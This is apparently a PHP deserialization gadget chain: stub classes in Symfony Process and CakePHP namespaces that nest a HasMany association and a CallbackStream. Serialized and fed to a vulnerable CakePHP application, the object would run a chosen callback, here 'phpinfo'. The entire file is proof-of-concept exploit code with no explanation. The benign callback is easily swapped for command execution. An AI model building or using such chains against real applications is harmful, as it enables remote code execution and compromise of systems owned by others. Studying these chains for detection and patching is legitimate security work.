<?php

namespace Symfony\Component\Process
{
	class Process
	{
		private $options;
		private $processPipes;
		
		function __construct()
		{
			$this->options = ['create_new_console'=>true];
			$this->processPipes = new \Cake\ORM\Association\HasMany();
		}
	}
}

namespace Cake\ORM\Association
{
	class HasMany
	{
		protected $_targetTable=false;
		protected $_className;

		function __construct()
		{
			$this->_className = new \Cake\Http\CallbackStream();
		}
	}
}

namespace Cake\Http
{
	class CallbackStream
	{
		protected $callback;

		function __construct()
		{
			$this->callback = 'phpinfo';
		}
	}
}